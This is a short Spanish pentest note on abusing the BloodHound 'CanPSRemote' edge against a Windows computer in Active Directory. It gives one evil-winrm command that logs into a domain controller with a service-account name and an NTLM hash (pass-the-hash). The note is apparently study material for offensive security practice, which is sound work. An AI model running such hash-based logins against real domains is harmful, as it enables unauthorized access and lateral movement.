# Abuso ACL

Tags: #AD #ACL #Linux 

## CanPSRemote sobre una Computadora/Equipo Windows 

* El icono en BloodHound, la **Computadora o Equipo Windows** aparece representada con el **icono de un computador** color rojo.

```bash 
# Si se tiene este privilegio se puede conectar al server 
❯ evil-winrm -i IP_DC -u 'user$' -H e0915507b35c02ccc57959c4a1fc6051 

NOTA:
	- Hay ocasiones donde el usuario que tiene los permisos es un usuario de servicio, por eso el simbolo '$'
```